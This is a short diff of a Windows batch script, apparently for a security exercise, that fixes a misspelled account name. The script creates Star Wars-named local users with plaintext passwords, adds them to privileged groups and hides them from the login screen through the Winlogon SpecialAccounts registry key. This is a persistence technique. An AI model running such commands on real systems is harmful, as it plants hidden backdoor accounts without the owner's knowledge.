@@ -1,4 +1,4 @@
-net user leah_organa help_me_obiw@n /ADD
+net user leia_organa help_me_obiw@n /ADD
 net user luke_skywalker use_the_f0rce /ADD
 net user han_solo sh00t-first /ADD
 net user artoo_detoo beep_b00p /ADD
@@ -14,7 +14,7 @@ net user greedo hanShotFirst! /ADD
 net user chewbacca rwaaaaawr5 /ADD
 net user kylo_ren daddy_issues1 /ADD
 
-net localgroup "Backup Operators" leah_organa /ADD
+net localgroup "Backup Operators" leia_organa /ADD
 net localgroup "Certificate Service DCOM Access" luke_skywalker /ADD
 net localgroup "Cryptographic Operators" han_solo /ADD
 net localgroup "Distributed COM Users" artoo_detoo /ADD
@@ -29,7 +29,7 @@ net localgroup "Print Operators" jabba_hutt /ADD
 net localgroup "Remote Desktop Users" greedo /ADD
 net localgroup "Replicator" chewbacca /ADD
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v leah_organa /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v leia_organa /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v luke_skywalker /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v han_solo /t REG_DWORD /d 0 /f
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v artoo_detoo /t REG_DWORD /d 0 /f
